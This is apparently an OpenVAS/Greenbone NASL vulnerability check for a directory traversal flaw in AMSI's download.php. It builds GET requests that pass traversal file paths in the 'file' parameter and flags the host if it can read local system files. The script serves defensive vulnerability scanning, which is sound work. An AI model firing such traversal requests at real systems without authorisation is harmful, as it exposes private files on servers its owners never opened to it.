if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805237" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-01-12 16:30:44 +0530 (Mon, 12 Jan 2015)" );
	script_name( "AMSI 'file' Parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/129714" );
	script_tag( name: "summary", value: "This host is installed with Academia
  management solutions international (AMSI) and is prone to directory traversal
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not." );
	script_tag( name: "insight", value: "The error exists due to the download.php
  script, which does not properly sanitize user input supplied via the 'file'
  parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  remote attackers to read arbitrary files on the target system." );
	script_tag( name: "affected", value: "AMSI v3.20.47 build 37 and probably other
  versions." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/amsi", "/AMSI", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = dir + "/download.php?file=" + files[file];
		if(http_vuln_check( port: http_port, url: url, pattern: file, extra_check: make_list( "amsi_web",
			 "amsi_moodle" ) )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

